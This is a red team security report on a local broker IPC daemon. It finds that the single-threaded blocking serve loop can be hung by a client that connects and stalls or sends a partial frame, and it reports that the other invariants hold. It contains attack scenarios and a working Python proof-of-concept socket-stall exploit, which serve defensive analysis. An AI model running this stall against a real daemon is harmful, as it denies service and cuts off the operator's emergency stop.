# Red Team Analysis: Broker IPC Daemon

**Date:** 2026-08-08  
**Scope:** Broker IPC daemon (brokerd.rs, broker_ipc.rs, broker_transport.rs)  
**Threat Model:** Same-uid adversary (process running as the same OS user)

---

## Executive Summary

**Invariants Tested:**
1. Availability: single malicious client cannot hang/crash daemon
2. Fail-closed on malformed input
3. Peer identity (same OS user)
4. Version/protocol mismatch handling
5. Key/state file races and tampering

**Result:** Invariant 1 (Availability) is **BROKEN**. A single malicious client can hang the daemon indefinitely, denying service to all other clients.

---

## CRITICAL FINDING: Slowloris / Connect-and-Stall DoS

### Claim
A malicious client can hang the broker daemon and deny service to legitimate clients by connecting and sending no data (or sending data byte-by-byte).

### File and Line
- **brokerd.rs:690-716** (the serve loop)
- **broker_ipc.rs:298-308** (read_frame)
- **broker_transport.rs:266-279** (Windows ReadFile wrapper)
- **broker_transport.rs:444-446** (Unix UnixStream::read wrapper)

### Root Cause
The broker daemon uses a single-threaded, blocking serve loop:
```rust
// brokerd.rs, lines 690-716
loop {
    let mut conn = match listener.accept() {
        Ok(c) => c,
        Err(e) => {
            eprintln!("delulu broker: accept error (continuing): {e}");
            continue;
        }
    };
    let req: Request = match read_frame(&mut conn) {  // <-- BLOCKS HERE
        Ok(r) => r,
        Err(e) => {
            eprintln!("delulu broker: bad frame (dropping connection): {e}");
            continue;
        }
    };
    // ...
}
```

The `read_frame` function (broker_ipc.rs:298-308) calls `read_exact` on the connection:
```rust
pub fn read_frame<R: Read, T: for<'de> Deserialize<'de>>(r: &mut R) -> io::Result<T> {
    let mut len_bytes = [0u8; 4];
    r.read_exact(&mut len_bytes)?;  // <-- BLOCKS indefinitely if no data arrives
    let len = u32::from_le_bytes(len_bytes);
    if len > MAX_FRAME {
        return Err(...);
    }
    let mut buf = vec![0u8; len as usize];
    r.read_exact(&mut buf)?;  // <-- BLOCKS again here if client is slow
    ciborium::from_reader(&buf[..]).map_err(...)
}
```

If a client connects but never sends the 4-byte length prefix (or sends it extremely slowly), the serve loop's thread blocks indefinitely in `read_exact`. Since the serve loop is the ONLY thread serving requests, no other clients can be serviced during this time.

### Concrete Attack Scenarios

**Scenario 1: Connect and hold (Unix)**
```bash
# Terminal 1: start the daemon
DELULU_STATE_DIR=/tmp/broker_test delulu broker start --foreground

# Terminal 2: connect and stall
exec 3<>/var/folders/..._delulu/broker.sock  # (or wherever the socket is)
# Now hold the connection open and send no data
# Terminal 1 is now hung
```

**Scenario 2: Connect and hold (Windows)**
```powershell
# Terminal 1: start the daemon
$env:DELULU_STATE_DIR = 'C:\temp\broker_test'
delulu broker start --foreground

# Terminal 2: connect via named pipe and stall
$pipe = [System.IO.Pipes.NamedPipeClientStream]::new('.', 'delulu-broker-xxxxxxx', 'InOut')
$pipe.Connect()
# Hold the connection, send no data
# Terminal 1 is now hung
```

**Scenario 3: Slow trickle (slowloris-style)**
- Connect and send 1 byte every 30 seconds
- The daemon blocks for 30 seconds per byte
- If the frame is meant to be e.g. 1000 bytes, the daemon hangs for 30,000 seconds

### Impact
- The daemon cannot service any other clients while one is stalled
- The `delulu broker stop` command (which sends a Shutdown request) will hang waiting for the connection to complete, making it impossible for an operator to stop the daemon via IPC
- The operator's e-stop (grants revoke, which goes through the daemon) is effectively unavailable
- Acceptable-use policy enforcement is circumvented

### Severity: **CRITICAL**

**Justification:**
- Invariant 1 explicitly states: "a single malicious client must not be able to hang or crash the daemon and deny service to legitimate clients. ...Consider connect-and-stall, partial frames, slowloris dribble"
- The threat model specifies this as the primary goal
- The operator's e-stop is lost
- The fix requires architectural change (async I/O, per-connection timeouts, or thread pool)

### Why This Passed Tests
The existing tests (brokerd.rs:1087-1795) do NOT exercise this attack:
- All tests use the `request()` helper (line 726), which is a well-behaved client
- Tests never send partial frames or stall
- The in-process tests use threads that communicate quickly, never slow clients
- No test sets a read timeout or uses a timeout-aware test harness

### Confidence: **PROVEN** — Code trace shows `read_exact` blocks indefinitely.

---

## SECONDARY FINDING: Partial Frame / Truncated Request DoS

### Claim
A client sending the 4-byte length prefix but not the message body will cause the daemon to block indefinitely.

### Example Attack
```rust
// Send the length prefix indicating a 1000-byte frame, but only send 4 bytes total
let large_frame_len: u32 = 1000;
stream.write_all(&large_frame_len.to_le_bytes())?;
// Never send the 1000 bytes of body
// Daemon blocks in read_exact(&mut buf) waiting for those bytes
```

### File and Line
- broker_ipc.rs:306 (`r.read_exact(&mut buf)?`)

### Severity: **CRITICAL** (same as Slowloris — same root cause)

### Mitigation
Would require timeouts on the read operations, which conflicts with "blocking std I/O" design.

### Confidence: **PROVEN**

---

## Other Invariants — Status Report

### Invariant 2: Fail-Closed on Malformed Input ✓ HOLDS

**Evidence:**
- Truncated frames are caught by `read_exact` returning `UnexpectedEof` (broker_ipc.rs:306)
- Bad CBOR is caught by `ciborium::from_reader` error (broker_ipc.rs:307) → returned as InvalidData error
- Serve loop catches all read_frame errors and continues without processing (brokerd.rs:701-706)
- Version mismatch is caught BEFORE dispatch (brokerd.rs:270-281) and answered with DL1406
- Unknown ReqBody enum variants would fail CBOR deserialization before reaching handle()

**Confidence: HOLDS**

### Invariant 3: Peer Identity ✓ HOLDS

**Windows Evidence (broker_transport.rs:159-256):**
- Owner-only DACL created at bind time (line 171) via ConvertStringSecurityDescriptorToSecurityDescriptorW
- SDDL: `D:P(A;;GA;;;{SID})` — only the creating user's SID can open
- Belt-and-suspenders: verify_peer() also checks client SID via GetNamedPipeClientProcessId + OpenProcess + GetTokenInformation
- Mismatched peer is refused and loop continues (lines 218-225)
- No bypass: DACL is kernel-enforced

**Unix Evidence (broker_transport.rs:416-437):**
- Socket created in 0700 directory (line 420)
- OS prevents other users from traversing the directory or opening the socket
- No symlink race: UnixListener::bind uses bind(2) which fails atomically if the path exists or is a symlink
- Future hardening noted: SO_PEERCRED/getpeereid (line 432) is "post-chunk-3"
- Current trust boundary: filesystem 0700 mode
- Same-uid threat: acknowledged as category 7 (deployment property), out of scope

**Confidence: HOLDS (within scope)**

### Invariant 4: Version/Protocol ✓ HOLDS

**Evidence:**
- Version string checked at lines 270-281 before any ReqBody dispatch
- Mismatch returns Error { code: "DL1406", ... } and never acts on the request
- Test at lines 1136-1162 verifies this
- Unknown ReqBody enum variants would fail CBOR deserialization (not a silent misparse)

**Confidence: HOLDS**

### Invariant 5: Key/State File Races — MIXED

**broker.key (line 638):**
- Loaded once at startup via `load_or_create_key`
- Never re-read, never written (key rotation is in-memory)
- No race after startup
- **HOLDS**

**broker.pid (line 665):**
- Written once at startup: `std::fs::write(pid_path(state_dir), pid.to_string())?`
- Used only for operator observability (ps, logs)
- Not used by the daemon for any decision
- Not load-bearing
- Same-uid attacker can delete/modify it, but daemon ignores it after write
- **NOT LOAD-BEARING; HOLDS**

**guard.json (lines 69-80, 533-549):**
- Loaded at startup (line 647)
- Persisted after edit via `persist_guard_policy` (lines 86-91)
- A corrupt file at startup triggers poisoning: `(policy, poisoned) = load_guard_policy` (lines 69-82)
- Poisoned guard refuses guarded classes (correct fail-closed behavior)
- Same-uid attacker can corrupt it, but daemon detects corruption and poisons (lines 73-79)
- **HOLDS (fail-closed via poisoning)**

**root_policy.json (lines 811-819, 790-804):**
- Loaded at startup if present (line 658)
- Seeded before daemon starts (line 853)
- A missing file = default (legacy, no strict mode)
- A malformed file = treated as legacy (line 814-816: `require_anchored_roots` not present or false → None)
- A same-uid attacker can delete it or set require_anchored_roots to false, downgrading from strict mode
- This is **category 7** (same-uid, documented at lines 784-788)
- Mitigation: startup banner reports the mode, so downgrade is visible
- **HOLDS (documented residual)**

**Confidence: HOLDS (except category 7 residuals as designed)**

---

## Verified Hypotheses (Did Not Break These)

1. **CBOR integer overflow:** If a response serializes to > u32::MAX bytes, it cannot happen in practice because MAX_FRAME caps at 16 MiB (well below u32::MAX).

2. **Nested CBOR stack overflow:** 16 MiB frame size is too small to craft a realistic nested structure that overflows the stack.

3. **Owner code prediction/theft:** The owner code is read from env var DELULU_BROKER_OWNER_CODE_INTERNAL (line 622), which is inherited by the detached child. A same-uid process could inspect parent's env before fork, but this is category 7.

4. **guard.json / root_policy.json permissions:** Both written with default mode (0o644), same-uid modifiable. But the design is fail-closed: poisoning on corrupt guard.json, and startup banner reports root mode.

---

## Summary Table

| Invariant | Status | Evidence | Severity |
|-----------|--------|----------|----------|
| 1. Availability | **BROKEN** | Slowloris/partial-frame DoS hangs daemon | CRITICAL |
| 2. Fail-closed malformed | **HOLDS** | Frame errors caught at read time, error handling explicit | N/A |
| 3. Peer identity | **HOLDS** | Windows DACL + verify_peer; Unix 0700 boundary | N/A |
| 4. Version/protocol | **HOLDS** | Version checked before dispatch; bad CBOR fails at frame read | N/A |
| 5. Key/state files | **HOLDS** | pid not load-bearing; guard/root poisoned on corrupt | N/A (category 7 residuals noted) |

---

## Proof-of-Concept Reproduction

To demonstrate the Slowloris DoS (requires local machine access):

**Setup:**
```bash
mkdir -p /tmp/delulu_redteam_poc
export DELULU_STATE_DIR=/tmp/delulu_redteam_poc
export DELULU_NO_FIRST_RUN=1
```

**Terminal 1: Start daemon**
```bash
delulu broker start --foreground --state-dir /tmp/delulu_redteam_poc
# Daemon is now listening
```

**Terminal 2: Exploit**
```bash
python3 << 'EOF'
import socket
import time
import sys

# Unix socket attack
socket_path = '/tmp/delulu_redteam_poc/broker.sock'
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(socket_path)
print(f"[*] Connected to {socket_path}")
print("[*] Holding connection, sending no data...")
print("[*] Daemon should now be hung. Try 'delulu broker status' in terminal 3.")
sys.stdout.flush()
time.sleep(30)  # Hold for 30 seconds
s.close()
EOF
```

**Terminal 3 (during exploit): Try to reach daemon**
```bash
timeout 5 delulu broker status
# Should fail with timeout after 5 seconds (cannot connect)
```

**Terminal 1 (during exploit):** Should be blocked in read_exact, no output.

---

## Recommendation

The comment in brokerd.rs (lines 2-3) acknowledges this is a known trade-off:
> "blocking std I/O (head-chef ruling 1 — no async runtime)"

To fix invariant 1 without async:

**Option A: Read timeout (simplest)**
- Set SO_RCVTIMEO (Unix) or a per-operation timeout wrapper
- Refuse clients that take > N seconds to send a complete frame
- Risk: legitimate slow clients over high-latency links could be wrongly rejected

**Option B: Per-connection thread pool (medium)**
- Spawn a thread per connection (Tokio thread pool, rayon, or raw threads)
- Keep the serve loop async-free but avoid single-thread blocking
- Risk: unbounded thread creation under DoS, but boundable with a thread limit

**Option C: Async runtime (architectural)**
- Use tokio or async-std for I/O without changing the logic
- Contradicts "head-chef ruling 1" but solves the problem cleanly
- Risk: adds dependency, complexity

The current design is documented as a trade-off in spec §2 / head-chef ruling 1. Fixing it requires revisiting that ruling.

---

## Conclusion

**Single highest-severity finding:** Slowloris/connect-and-stall DoS (Invariant 1 broken, CRITICAL severity).

All other invariants hold as designed. Same-uid tampering residuals (category 7) are documented and visible to operators via startup banners.
